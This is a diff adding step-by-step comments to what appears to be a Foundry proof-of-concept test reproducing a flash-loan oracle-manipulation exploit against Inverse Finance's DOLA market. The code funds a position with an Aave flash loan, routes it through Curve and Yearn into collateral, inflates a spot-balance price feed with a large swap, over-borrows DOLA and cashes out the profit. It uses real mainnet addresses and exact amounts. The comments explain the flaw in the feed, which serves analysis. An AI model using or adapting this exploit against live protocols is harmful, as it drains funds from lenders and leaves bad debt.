@@ -20,6 +20,7 @@ contract ContractTest is Test {
     CErc20Interface anYvCrv3CryptoInverse = CErc20Interface(0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587);
     IUnitroller Unitroller = IUnitroller(0x4dCf7407AE5C07f8681e1659f626E114A7667339);
     IAggregator YVCrv3CryptoFeed = IAggregator(0xE8b3bC58774857732C6C1147BFc9B9e5Fb6F427C);
+    // The borrow target: DOLA market on Inverse's Compound-fork. Its borrowAllowed relies on collateral values from the manipulable feed above.
     CErc20Interface InverseFinanceDola = CErc20Interface(0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670);
     IERC20 crv3 = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
     address[] assets = [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599];
@@ -33,6 +34,8 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
+        // EXPLOIT STEP 0: Use Aave flashloan as the funding source. This provides the WBTC needed both to seed the (small) collateral position
+        // and to execute the massive swap that manipulates the oracle. The entire attack is atomic; flashloan is repaid in executeOperation.
         aaveLendingPool.flashLoan(address(this), assets, amounts, modes, address(this), "0x", 0);
         emit log_named_uint("After flashloan repaid, profit in WBTC of attacker:", WBTC.balanceOf(address(this)));
     }
@@ -50,6 +53,9 @@ contract ContractTest is Test {
         params;
         initiator;
 
+        // EXPLOIT STEP 1: Approve tokens for Curve/Yearn/Inverse interactions. Flash-loaned WBTC gives attacker the capital needed to seed collateral
+        // and perform the large swap without using own funds (repaid atomically at end).
+
         WBTC.approve(address(curveVyper_contract), type(uint256).max);
         WBTC.approve(address(curveRegistry), type(uint256).max);
         usdt.approve(address(curveRegistry), type(uint256).max);
@@ -58,13 +64,23 @@ contract ContractTest is Test {
 
         emit log_named_uint("Flashloaned, WBTC balance of attacker:", WBTC.balanceOf(address(this)) / 1e8);
 
+        // EXPLOIT STEP 2: Add liquidity to Curve tricrypto pool (using portion of flash funds / obtained assets) to receive crv3crypto LP tokens.
+        // This seeds the position that will be wrapped and used as collateral. (The specific amounts2 array targets the pool composition.)
+
         curveVyper_contract.add_liquidity(amounts2, 0);
         emit log_named_uint("After add-liquidity, crv3crypto balance of attacker:", crv3crypto.balanceOf(address(this)));
         emit log_named_uint("After add-liquidity, WBTC balance of attacker:", WBTC.balanceOf(address(this)) / 1e8);
+
+        // EXPLOIT STEP 3: Deposit the received crv3crypto LP into Yearn's yvCurve3Crypto vault. Receive yv tokens which represent the underlying LP position.
+        // The yv token will be the actual "underlying" supplied to Inverse's cToken market.
         yvCurve3Crypto.deposit(5_375_596_969_399_930_881_565, address(this));
         emit log_named_uint(
             "Deposited to Yearns Vault, yvCurve3 balance of attacker:", yvCurve3Crypto.balanceOf(address(this))
         );
+
+        // EXPLOIT STEP 4: Supply the yvCurve3Crypto tokens into Inverse's anYvCrv3CryptoInverse cToken (mint cTokens).
+        // This creates a collateral position. Then enterMarkets() so the cToken counts toward borrow capacity in the Comptroller.
+        // At this point collateral value is based on PRE-manipulation oracle price.
         yvCurve3Crypto.approve(
             0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587,
             100_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000
@@ -77,6 +93,16 @@ contract ContractTest is Test {
         address[] memory toEnter = new address[](1);
         toEnter[0] = 0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587;
         Unitroller.enterMarkets(toEnter);
+
+        // VULNERABILITY: Manipulable spot-balance price oracle in YVCrv3CryptoFeed
+        // The custom feed (used as price source for anYvCrv3CryptoInverse collateral market) derives the price of the yvCurve3Crypto underlying
+        // exclusively from CURRENT token balances held in the Curve tricrypto pool (WBTC/WETH/USDT) multiplied by their external aggregator prices,
+        // then divided by LP supply and multiplied by yearn's pricePerShare. No TWAP, no Curve.get_virtual_price(), no depth/slippage guards.
+        // See equivalent logic in sources/YVCrv3CryptoFeed_E8b3bC/YVCrv3CryptoFeed.sol:116 (latestAnswer).
+        // Swapping changes the pool's spot balances => directly changes the "fair" value the feed reports for the LP token (and thus for yv shares).
+        // Impact: Collateral value for borrow capacity (queried in Comptroller via getAccountLiquidity / getUnderlyingPrice path during borrowAllowed)
+        // can be inflated arbitrarily with a sufficiently large flash-loan-funded swap. Allows over-borrow of DOLA against under-collateralized (in economic terms) position.
+        // The protocol (lenders to the DOLA market) loses the excess borrowed value as unrecoverable bad debt.
 
         emit log_named_int("YVCrv3CryptoFeed lastanswer:", YVCrv3CryptoFeed.latestAnswer());
         emit log_named_uint("Before swap, USDT balance of attacker:", usdt.balanceOf(address(this)));
@@ -91,12 +117,24 @@ contract ContractTest is Test {
         emit log_named_uint("After swap, WBTC balance of CRV3Pool:", WETH.balanceOf(address(curveVyper_contract)));
         emit log_named_uint("After swap, USDT balance of CRV3Pool:", usdt.balanceOf(address(curveVyper_contract)));
         emit log_named_int("Manipulated YVCrv3CryptoFeed lastanswer:", YVCrv3CryptoFeed.latestAnswer());
+
+        // EXPLOIT STEP 5: Borrow DOLA against the now-inflated collateral value.
+        // Because YVCrv3CryptoFeed reports a manipulated (higher) price, the cToken balance of anYvCrv3CryptoInverse now gives the attacker
+        // much higher USD collateral value in the Unitroller's liquidity calculation. The borrow on the DOLA market (InverseFinanceDola)
+        // succeeds far beyond what the true economic value of the deposited yvCurve3Crypto would allow.
+        // The borrow call goes through CErc20Interface.borrow -> comptroller.borrowAllowed which relies on the faulty oracle price.
         InverseFinanceDola.borrow(10_133_949_192_393_802_606_886_848);
         emit log_named_uint("DOLA balance of attacker:", DOLA.balanceOf(address(this)));
+
+        // EXPLOIT STEP 6 (unwind manipulation): Reverse the large swap (USDT -> WBTC) on Curve to restore pool balances and unwind the oracle manipulation.
+        // This step also converts some proceeds back toward WBTC.
         curveRegistry.exchange(
             address(curveVyper_contract), address(usdt), address(WBTC), 75_403_376_186_072, 0, address(this)
         );
         emit log_named_uint("After swap, WBTC balance of attacker:", WBTC.balanceOf(address(this)) / 1e8);
+
+        // EXPLOIT STEP 7: Swap the borrowed DOLA through the DOLA-3pool-crv3 and 3pool to obtain USDT, then WBTC.
+        // Effectively monetizes the over-borrowed DOLA into the flash-loan asset (WBTC) for repayment + profit.
         curveRegistry.exchange(
             address(dola3pool3crv), address(DOLA), address(crv3), 10_133_949_192_393_802_606_886_848, 0, address(this)
         );
@@ -107,6 +145,8 @@ contract ContractTest is Test {
             address(curveVyper_contract), address(usdt), address(WBTC), 10_000_000_000_000, 0, address(this)
         );
         emit log_named_uint("After swap, WBTC balance of attacker:", WBTC.balanceOf(address(this)));
+
+        // Repay Aave flashloan principal + premium (implicit in approval amount); leftover WBTC is attacker's profit.
         WBTC.approve(address(aaveLendingPool), 2_702_430_000_000);
 
         return true;
